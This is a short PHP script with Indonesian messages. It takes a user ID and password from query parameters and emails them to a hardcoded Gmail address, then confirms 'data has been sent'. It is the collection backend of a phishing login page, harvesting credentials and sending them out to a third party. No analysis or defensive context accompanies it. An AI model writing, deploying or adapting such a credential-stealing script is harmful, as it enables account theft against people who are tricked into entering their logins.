
<?php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    $id = $_GET["id"];
    $password = $_GET["password"];

    $to = "imoell10101988@gmail.com";
    $subject = "Data Pengguna Masuk";
    $message = "ID Pengguna: $id\nPassword: $password";

    mail($to, $subject, $message);

    echo "Data telah dikirim.";
} else {
    echo "Permintaan tidak valid.";
}
?>
